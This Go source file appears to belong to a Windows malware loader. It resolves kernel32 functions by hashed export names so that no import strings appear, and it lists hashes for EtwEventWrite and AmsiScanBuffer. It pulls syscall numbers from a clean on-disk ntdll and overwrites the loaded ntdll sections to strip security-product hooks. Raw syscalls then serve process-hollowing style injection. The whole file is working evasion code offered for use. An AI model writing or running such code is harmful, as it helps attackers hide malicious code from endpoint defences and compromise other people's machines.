// apihash.go — DInvoke-style dynamic resolution + ntdll unhook + indirect syscalls.
//
// Loader uses no static IAT for the sensitive operations below; function
// addresses are resolved at runtime by walking the PEB module list and matching
// export names by djb2 hash (no import strings in the PE).
//
// ntdll .text is restored from a clean on-disk copy to remove EDR hooks, and the
// memory/thread operations are issued as raw syscalls (ntSyscall) by number so
// they never traverse the (hooked) ntdll exports.
//
//go:build windows && amd64

package main

import (
	"fmt"
	"os"
	"strings"
	"syscall"
	"unsafe"

	"loader/ntsys"
)

func ntSyscall(num uintptr, a1, a2, a3, a4, a5, a6 uintptr) uintptr {
	return ntsys.Syscall(num, a1, a2, a3, a4, a5, a6)
}

// djb2 hashes of the export names we resolve (precomputed, no strings).
const (
	H_CreateProcessW       = 0xaeb52e2f
	H_VirtualProtectEx     = 0xd812922a
	H_VirtualProtect       = 0x844ff18d
	H_WriteProcessMemory   = 0x6f22e8c8
	H_GetThreadContext     = 0xeba2cfc2
	H_SetThreadContext     = 0x7e20964e
	H_ResumeThread         = 0x74162a6e
	H_CloseHandle          = 0x3870ca07
	H_VirtualAllocEx       = 0xf36e5ab4
	H_CreateToolhelp32Snap = 0x66851295
	H_Module32FirstW       = 0xc9dc792f
	H_Module32NextW        = 0xa1d369e6
	H_ReadProcessMemory    = 0xb8932459
	H_WaitForSingleObject  = 0xeccda1ba
	H_GetProcAddress       = 0xcf31bb1f
	H_LoadLibraryW         = 0x5fbff111
	H_GetModuleHandleW     = 0x5a153f6e
	H_GetCurrentProcess    = 0xca8d7527
	H_EtwEventWrite        = 0x24a8d022
	H_AmsiScanBuffer       = 0x29fcd18e
)

const (
	H_NtProtectVirtualMemory = 0x082962c8
	H_NtWriteVirtualMemory   = 0x95f3a792
	H_NtGetContextThread     = 0x9e0e1a44
	H_NtSetContextThread     = 0x308be0d0
	H_NtResumeThread         = 0x2c7b3d30
	H_NtReadVirtualMemory    = 0xc24062e3
)

// evAPIs holds every resolved address / syscall number the loader needs.
type evAPIs struct {
	// kernel32 (called via SyscallN after hash resolution)
	CreateProcessW       uintptr
	VirtualProtect       uintptr
	VirtualProtectEx     uintptr
	WriteProcessMemory   uintptr
	GetThreadContext     uintptr
	SetThreadContext     uintptr
	ResumeThread         uintptr
	CloseHandle          uintptr
	VirtualAllocEx       uintptr
	CreateToolhelp32Snap uintptr
	Module32FirstW       uintptr
	Module32NextW        uintptr
	ReadProcessMemory    uintptr
	WaitForSingleObject  uintptr
	// indirect syscall numbers (clean ntdll)
	NtProtectVirtualMemory uint32
	NtWriteVirtualMemory   uint32
	NtGetContextThread     uint32
	NtSetContextThread     uint32
	NtResumeThread         uint32
	Ready                  bool
}

var ev evAPIs

func hashBytes(b []byte) uint32 {
	h := uint32(5381)
	for _, c := range b {
		h = h*33 + uint32(c)
	}
	return h
}

func read32(p uintptr) uint32 { return *(*uint32)(unsafe.Pointer(p)) }
func read16(p uintptr) uint16 { return *(*uint16)(unsafe.Pointer(p)) }
func readPtr(p uintptr) uintptr {
	return *(*uintptr)(unsafe.Pointer(p))
}

func cstr(p uintptr, max int) string {
	if p == 0 {
		return ""
	}
	var b []byte
	for i := 0; i < max; i++ {
		c := *(*byte)(unsafe.Pointer(p + uintptr(i)))
		if c == 0 {
			break
		}
		b = append(b, c)
	}
	return string(b)
}

// resolveExport returns the address of funcNameHash within module base.
func resolveExport(base uintptr, nameHash uint32) (uintptr, error) {
	if base == 0 {
		return 0, fmt.Errorf("nil module base")
	}
	eLfanew := read32(base + 0x3C)
	pe := base + uintptr(eLfanew)
	if read32(pe) != 0x00004550 { // "PE\0\0"
		return 0, fmt.Errorf("bad PE signature")
	}
	magic := read16(pe + 0x18)
	if magic != 0x20b {
		return 0, fmt.Errorf("not PE32+")
	}
	opt := pe + 0x18 // PE32+ optional header start
	expRVA := read32(opt + 0x70)
	if expRVA == 0 {
		return 0, fmt.Errorf("no export dir")
	}
	exp := base + uintptr(expRVA)
	numNames := read32(exp + 0x18)
	namesRVA := read32(exp + 0x20)
	ordRVA := read32(exp + 0x24)
	funcsRVA := read32(exp + 0x1C)
	for i := uint32(0); i < numNames; i++ {
		nameRVA := read32(base + uintptr(namesRVA) + uintptr(i*4))
		name := cstr(base+uintptr(nameRVA), 128)
		if hashBytes([]byte(name)) == nameHash {
			ord := read16(base + uintptr(ordRVA) + uintptr(i*2))
			fRVA := read32(base + uintptr(funcsRVA) + uintptr(ord*4))
			return base + uintptr(fRVA), nil
		}
	}
	return 0, fmt.Errorf("export %#x not found", nameHash)
}

// moduleBaseByName returns the base/size of a loaded DLL in THIS process via
// Toolhelp (dynamic resolution, no static import). System DLL base addresses are
// identical across processes on the same machine, so this is valid for the
// hollowed/stomped target too.
func moduleBaseByName(want string) (uintptr, uint32) {
	snap, _, _ := procCreateToolhelp32Snap.Call(TH32CS_SNAPMODULE|TH32CS_SNAPMODULE32, uintptr(os.Getpid()))
	if snap == 0 || snap == INVALID_HANDLE_VALUE {
		return 0, 0
	}
	defer procCloseHandle.Call(snap)
	me := &moduleEntry32W{}
	me.Size = uint32(unsafe.Sizeof(*me))
	if r, _, _ := procModule32FirstW.Call(snap, uintptr(unsafe.Pointer(me))); r == 0 {
		return 0, 0
	}
	for {
		mod := syscall.UTF16ToString(me.Module[:])
		if strings.EqualFold(mod, want) {
			return me.ModBaseAddr, me.ModBaseSize
		}
		if r, _, _ := procModule32NextW.Call(snap, uintptr(unsafe.Pointer(me))); r == 0 {
			break
		}
	}
	return 0, 0
}

func utf16ToString(s []uint16) string {
	var b []byte
	for _, c := range s {
		if c < 0x80 {
			b = append(b, byte(c))
		} else if c < 0x800 {
			b = append(b, byte(0xC0|(c>>6)), byte(0x80|(c&0x3F)))
		} else {
			b = append(b, byte(0xE0|(c>>12)), byte(0x80|((c>>6)&0x3F)), byte(0x80|(c&0x3F)))
		}
	}
	return string(b)
}

// sectionInfo maps an RVA to a file offset within an image's on-disk bytes.
func rvaToFileOff(img []byte, rva uint32) (uint32, bool) {
	if len(img) < 0x40 {
		return 0, false
	}
	eLfanew := read32(uintptr(unsafe.Pointer(&img[0])) + 0x3C)
	if int(eLfanew)+4+20+112+8 > len(img) {
		return 0, false
	}
	sec := uintptr(unsafe.Pointer(&img[0])) + uintptr(eLfanew) + 4 + 20
	numSec := read16(sec - 0x4 + 2) // NumberOfSections at FileHeader+2
	for i := uint16(0); i < numSec; i++ {
		sh := sec + uintptr(i*40)
		va := read32(sh + 12)
		vsize := read32(sh + 8)
		raw := read32(sh + 20)
		if rva >= va && rva < va+vsize {
			return raw + (rva - va), true
		}
	}
	return 0, false
}

// syscallNumberFromImage extracts the syscall number of an Nt* export from a
// clean ntdll byte image. Stub pattern: 4C 8B D1 B8 <num> 0F 05.
func syscallNumberFromImage(img []byte, nameHash uint32) (uint32, error) {
	// resolve export RVA via export directory in the byte image
	base := uintptr(unsafe.Pointer(&img[0]))
	eLfanew := read32(base + 0x3C)
	pe := base + uintptr(eLfanew)
	opt := pe + 0x18
	expRVA := read32(opt + 0x70)
	exp := base + uintptr(expRVA)
	numNames := read32(exp + 0x18)
	namesRVA := read32(exp + 0x20)
	ordRVA := read32(exp + 0x24)
	funcsRVA := read32(exp + 0x1C)
	target := uint32(0)
	for i := uint32(0); i < numNames; i++ {
		nameRVA := read32(base + uintptr(namesRVA) + uintptr(i*4))
		if off, ok := rvaToFileOff(img, nameRVA); ok {
			name := cstr(base+uintptr(off), 128)
			if hashBytes([]byte(name)) == nameHash {
				ord := read16(base + uintptr(ordRVA) + uintptr(i*2))
				target = read32(base + uintptr(funcsRVA) + uintptr(ord*4))
				break
			}
		}
	}
	if target == 0 {
		return 0, fmt.Errorf("ntdll export not found")
	}
	off, ok := rvaToFileOff(img, target)
	if !ok {
		return 0, fmt.Errorf("ntdll func rva unmapped")
	}
	if int(off)+12 > len(img) {
		return 0, fmt.Errorf("ntdll func out of range")
	}
	b := img[off : off+12]
	for i := 0; i+5 <= len(b); i++ {
		if b[i] == 0xB8 && b[i+5] == 0x0F && b[i+6] == 0x05 { // mov eax, imm32; syscall
			return uint32(b[i+1]) | uint32(b[i+2])<<8 | uint32(b[i+3])<<16 | uint32(b[i+4])<<24, nil
		}
	}
	return 0, fmt.Errorf("syscall stub pattern not found")
}

// unhookNtdll restores ntdll .text from a clean on-disk copy.
func unhookNtdll() error {
	img, err := os.ReadFile(xob(eNTDLLPath))
	if err != nil {
		return fmt.Errorf("read ntdll image: %w", err)
	}
	ntdBase, _ := moduleBaseByName(xob(eNTDLLName))
	if ntdBase == 0 {
		return fmt.Errorf("ntdll not in module list")
	}
	if len(img) < 0x40 {
		return fmt.Errorf("bad ntdll copy")
	}
	eLfanew := read32(uintptr(unsafe.Pointer(&img[0])) + 0x3C)
	sec := uintptr(unsafe.Pointer(&img[0])) + uintptr(eLfanew) + 4 + 20
	numSec := read16(sec - 0x4 + 2)
	for i := uint16(0); i < numSec; i++ {
		sh := sec + uintptr(i*40)
		va := read32(sh + 12)
		vsize := read32(sh + 8)
		raw := read32(sh + 20)
		if vsize == 0 || raw == 0 {
			continue
		}
		if vsize > uint32(len(img)) || raw+vsize > uint32(len(img)) {
			continue
		}
		// copy whole section (usually only .text is hooked; harmless elsewhere)
		dst := ntdBase + uintptr(va)
		old := uint32(0)
		pageStart := dst &^ 0xFFF
		regionSize := (vsize + uint32(dst-pageStart) + 0xFFF) &^ 0xFFF
		ok := ntProtectSelf(pageStart, regionSize, 0x40, &old) // PAGE_EXECUTE_READWRITE
		if !ok {
			continue
		}
		src := img[raw : raw+vsize]
		dstSlice := unsafe.Slice((*byte)(unsafe.Pointer(dst)), len(src))
		copy(dstSlice, src)
		ntProtectSelf(pageStart, regionSize, old, &old)
	}
	return nil
}

// ntProtectSelf calls NtProtectVirtualMemory on the current process via raw syscall.
func ntProtectSelf(addr uintptr, size uint32, newProtect uint32, old *uint32) bool {
	base := addr
	sz := uintptr(size)
	r := ntSyscall(uintptr(ev.NtProtectVirtualMemory),
		^uintptr(0), // NtCurrentProcess
		uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&sz)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(old)), 0)
	return r == 0
}

// InitEvasion resolves all APIs by hash and collects clean syscall numbers.
func InitEvasion() error {
	k32, _ := moduleBaseByName("kernel32.dll")
	if k32 == 0 {
		return fmt.Errorf("kernel32 not found")
	}
	var err error
	resolve := func(hash uint32) (uintptr, error) { return resolveExport(k32, hash) }
	if ev.CreateProcessW, err = resolve(H_CreateProcessW); err != nil {
		return err
	}
	ev.VirtualProtect, _ = resolve(H_VirtualProtect)
	ev.VirtualProtectEx, _ = resolve(H_VirtualProtectEx)
	ev.WriteProcessMemory, _ = resolve(H_WriteProcessMemory)
	ev.GetThreadContext, _ = resolve(H_GetThreadContext)
	ev.SetThreadContext, _ = resolve(H_SetThreadContext)
	ev.ResumeThread, _ = resolve(H_ResumeThread)
	ev.CloseHandle, _ = resolve(H_CloseHandle)
	ev.VirtualAllocEx, _ = resolve(H_VirtualAllocEx)
	ev.CreateToolhelp32Snap, _ = resolve(H_CreateToolhelp32Snap)
	ev.Module32FirstW, _ = resolve(H_Module32FirstW)
	ev.Module32NextW, _ = resolve(H_Module32NextW)
	ev.ReadProcessMemory, _ = resolve(H_ReadProcessMemory)
	ev.WaitForSingleObject, _ = resolve(H_WaitForSingleObject)

	// clean syscall numbers from on-disk ntdll
	img, err := os.ReadFile(xob(eNTDLLPath))
	if err != nil {
		return err
	}
	if n, e := syscallNumberFromImage(img, H_NtProtectVirtualMemory); e == nil {
		ev.NtProtectVirtualMemory = n
	}
	if n, e := syscallNumberFromImage(img, H_NtWriteVirtualMemory); e == nil {
		ev.NtWriteVirtualMemory = n
	}
	if n, e := syscallNumberFromImage(img, H_NtGetContextThread); e == nil {
		ev.NtGetContextThread = n
	}
	if n, e := syscallNumberFromImage(img, H_NtSetContextThread); e == nil {
		ev.NtSetContextThread = n
	}
	if n, e := syscallNumberFromImage(img, H_NtResumeThread); e == nil {
		ev.NtResumeThread = n
	}

	if err := unhookNtdll(); err != nil {
		fmt.Fprintf(os.Stderr, "apihash: unhook ntdll failed: %v\n", err)
	}
	ev.Ready = ev.NtProtectVirtualMemory != 0 && ev.NtWriteVirtualMemory != 0
	return nil
}
